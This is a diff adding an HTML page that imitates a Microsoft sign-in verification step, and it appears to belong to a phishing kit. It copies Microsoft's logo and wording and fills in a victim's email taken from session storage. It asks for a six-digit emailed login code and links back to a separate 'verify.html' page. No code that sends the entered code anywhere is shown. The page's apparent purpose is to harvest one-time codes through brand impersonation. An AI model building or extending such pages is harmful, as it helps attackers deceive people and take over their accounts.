@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Code</title>
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html, body {
+  width: 100%; height: 100%;
+  font-family: "Segoe UI", Arial, sans-serif;
+  background: linear-gradient(135deg, #eceef5 0%, #e2e6f0 50%, #d8dff0 100%);
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  min-height: 100vh;
+}
+
+.card {
+  background: #fff;
+  border-radius: 8px;
+  box-shadow: 0 2px 20px rgba(0,0,0,0.1);
+  padding: clamp(24px, 4vw, 44px) clamp(24px, 4vw, 44px);
+  width: min(460px, 90%);
+  display: flex; flex-direction: column; align-items: center;
+  text-align: center;
+}
+
+/* bouton retour */
+.back {
+  align-self: flex-start;
+  background: none; border: none;
+  font-size: clamp(16px, 3vw, 22px);
+  color: #333; cursor: pointer;
+  padding: 4px 6px; border-radius: 2px;
+  margin-bottom: 3%;
+}
+.back:hover { background: #f2f2f2; }
+
+/* logo */
+.ms-logo { display: flex; align-items: center; gap: 8px; margin-bottom: 5%; }
+.ms-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 2px; width: 20px; height: 20px; }
+.ms-grid span { display: block; }
+.ms-name { font-size: clamp(14px, 2.5vw, 18px); font-weight: 600; color: #1b1b1b; }
+
+/* pill */
+.pill {
+  padding: 4px 16px; border-radius: 20px;
+  background: #fff; border: 1px solid #d2d0ce;
+  font-size: clamp(11px, 2vw, 13px); color: #323130;
+  white-space: nowrap; max-width: 90%;
+  overflow: hidden; text-overflow: ellipsis;
+  margin-bottom: 5%;
+}
+
+h1 { font-size: clamp(18px, 3.5vw, 24px); font-weight: 700; color: #1b1b1b; margin-bottom: 3%; }
+
+.subtitle {
+  font-size: clamp(12px, 2vw, 14px); color: #605e5c;
+  line-height: 1.5; margin-bottom: 6%;
+  max-width: 85%;
+}
+
+/* cases code */
+.code-row {
+  display: flex;
+  gap: clamp(5px, 1.5vw, 10px);
+  margin-bottom: 5%;
+}
+.code-row .cbox:nth-child(4) { margin-left: clamp(6px, 2vw, 14px); }
+
+.cbox {
+  width: clamp(36px, 9vw, 50px);
+  height: clamp(42px, 9vw, 54px);
+  text-align: center;
+  font-size: clamp(16px, 4vw, 22px);
+  font-family: inherit;
+  background: #fff;
+  border: 1.5px solid #c8c6c4;
+  border-radius: 4px;
+  color: #1b1b1b;
+  outline: none;
+  transition: border-color 0.15s;
+}
+.cbox:focus { border: 2px solid #0078d4; }
+
+/* checkbox */
+.check-row {
+  display: flex; align-items: center; gap: 10px;
+  margin-bottom: 5%; align-self: flex-start;
+}
+.check-row input[type="checkbox"] {
+  width: 16px; height: 16px;
+  accent-color: #0078d4; cursor: pointer;
+}
+.check-row label {
+  font-size: clamp(11px, 2vw, 13px);
+  color: #1b1b1b; cursor: pointer;
+}
+
+/* footer */
+.footer {
+  margin-top: 6%;
+  font-size: clamp(10px, 1.5vw, 12px); color: #605e5c;
+  text-align: center;
+}
+.footer a { color: #0078d4; text-decoration: none; margin: 0 6px; }
+.footer a:hover { text-decoration: underline; }
+.footer-bottom { margin-top: 4px; }
+.footer-bottom a { color: #0078d4; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <button class="back" onclick="window.location.href='verify.html'">←</button>
+
+  <div class="ms-logo">
+    <div class="ms-grid">
+      <span style="background:#f25022"></span>
+      <span style="background:#7fba00"></span>
+      <span style="background:#00a4ef"></span>
+      <span style="background:#ffb900"></span>
+    </div>
+    <span class="ms-name">Microsoft</span>
+  </div>
+
+  <div class="pill" id="pill"></div>
+
+  <h1>Enter the code</h1>
+  <p class="subtitle" id="codeSub"></p>
+
+  <div class="code-row">
+    <input class="cbox" maxlength="1" inputmode="numeric">
+    <input class="cbox" maxlength="1" inputmode="numeric">
+    <input class="cbox" maxlength="1" inputmode="numeric">
+    <input class="cbox" maxlength="1" inputmode="numeric">
+    <input class="cbox" maxlength="1" inputmode="numeric">
+    <input class="cbox" maxlength="1" inputmode="numeric">
+  </div>
+
+  <div class="check-row">
+    <input type="checkbox" id="dontAsk" checked>
+    <label for="dontAsk">Don't ask me about this device again.</label>
+  </div>
+</div>
+
+<div class="footer">
+  <div>
+    <a href="#">Help</a>
+    <a href="#">Terms of Use</a>
+    <a href="#">Privacy and cookies</a>
+  </div>
+  <div class="footer-bottom">
+    Use private browsing if this is not your device. <a href="#">Learn more</a>
+  </div>
+</div>
+
+<script>
+const email = sessionStorage.getItem('email') || 'email@exemple.com';
+document.getElementById('pill').textContent = email;
+document.getElementById('codeSub').textContent =
+  'We have sent a code via email to ' + email + '. Enter the code to log in.';
+
+setTimeout(() => { document.querySelector('.cbox').focus(); }, 80);
+
+const boxes = document.querySelectorAll('.cbox');
+boxes.forEach((b, i) => {
+  b.addEventListener('input', () => {
+    b.value = b.value.replace(/\D/g, '').slice(0, 1);
+    if (b.value && boxes[i + 1]) boxes[i + 1].focus();
+  });
+  b.addEventListener('keydown', e => {
+    if (e.key === 'Backspace' && !b.value && boxes[i - 1]) boxes[i - 1].focus();
+  });
+});
+
+boxes[0].addEventListener('paste', e => {
+  e.preventDefault();
+  const t = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 6);
+  t.split('').forEach((c, i) => { if (boxes[i]) boxes[i].value = c; });
+  (boxes[t.length] || boxes[5]).focus();
+});
+</script>
+</body>
+</html>
